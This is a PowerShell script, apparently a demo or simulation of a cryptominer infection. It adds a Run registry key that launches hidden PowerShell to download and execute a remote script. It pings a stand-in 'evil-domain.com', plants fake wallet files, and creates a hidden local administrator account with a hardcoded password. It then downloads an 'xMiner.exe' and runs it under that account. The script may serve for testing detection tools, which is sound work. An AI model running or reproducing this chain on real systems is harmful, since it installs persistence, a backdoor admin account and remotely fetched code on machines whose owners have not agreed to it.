Start-Transcript -Path "C:\transcript-xminer.txt" -NoClobber;
cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""xMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"" /f"

Start-Sleep -s 2

cmd.exe /c "ping www.evil-domain.com"

Start-Sleep -s 2

New-Item -Path "c:\" -Name "wallet" -ItemType "directory"

New-Item -Path "c:\wallet" -Name "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z.coin" -ItemType "file" -Value "mfenXtMVwAKeKjzdrHYJFbsHeeqf7SDK3Z"
New-Item -Path "c:\wallet" -Name "mhsdyklbtTjfdeenckjRRHNUUKlerjurhu.coin" -ItemType "file" -Value "mhsdyklbtTjfdeenckjRRHNUUKlerjurhu"
New-Item -Path "c:\wallet" -Name "myuewtyolwUJULEWOyyiedfjhffenXtMVw.coin" -ItemType "file" -Value "myuewtyolwUJULEWOyyiedfjhffenXtMVw"
New-Item -Path "c:\wallet" -Name "mehdlkJJLlsdkdfHGGFFKdjsolKJKJkshs.coin" -ItemType "file" -Value "mehdlkJJLlsdkdfHGGFFKdjsolKJKJkshs"
New-Item -Path "c:\wallet" -Name "mRHKlkfdkdjGHJdsjsklsdJGKkwep3jnds.coin" -ItemType "file" -Value "mRHKlkfdkdjGHJdsjsklsdJGKkwep3jnds"
New-Item -Path "c:\wallet" -Name "m9djfJJKLhdyhdudslHHYHJHkdiwkjYUid.coin" -ItemType "file" -Value "m9djfJJKLhdyhdudslHHYHJHkdiwkjYUid"
New-Item -Path "c:\wallet" -Name "m5XFDkdikJKik87jHKJLdkhjwu6JHJKHSf.coin" -ItemType "file" -Value "m5XFDkdikJKik87jHKJLdkhjwu6JHJKHSf"
New-Item -Path "c:\wallet" -Name "mxJtyJDjh365DSijhgj7JHKJhgijlIOIuj.coin" -ItemType "file" -Value "mxJtyJDjh365DSijhgj7JHKJhgijlIOIuj"
New-Item -Path "c:\wallet" -Name "m15KJHJHdtwwnfchKJHljfdhjkhJH87jdh.coin" -ItemType "file" -Value "m15KJHJHdtwwnfchKJHljfdhjkhJH87jdh"
New-Item -Path "c:\wallet" -Name "mPdhgtHGHGrtdyt6erjh5kjhjhGGUjkduU.coin" -ItemType "file" -Value "mPdhgtHGHGrtdyt6erjh5kjhjhGGUjkduU"



cmd.exe /c "net user miner Mining4Ever! /add"
cmd.exe /c "net localgroup Administrators miner /add"


$miner = "https://raw.githubusercontent.com/tmmdemo/automate/master/xMiner.exe"
$DEST = "c:\wallet\xMiner.exe"
$web = New-Object -TypeName System.Net.WebClient
$web.DownloadFile($miner,$DEST)


#$fld = "c:\wallet"
#$Acl = Get-ACL $fld
#$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
#$Acl.AddAccessRule($AccessRule)
#Set-Acl $fld $Acl


$username = 'miner'
$password = 'Mining4Ever!'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath $DEST -WorkingDirectory "c:\wallet" -Credential ($credential)
#& $DEST
Stop-Transcript;


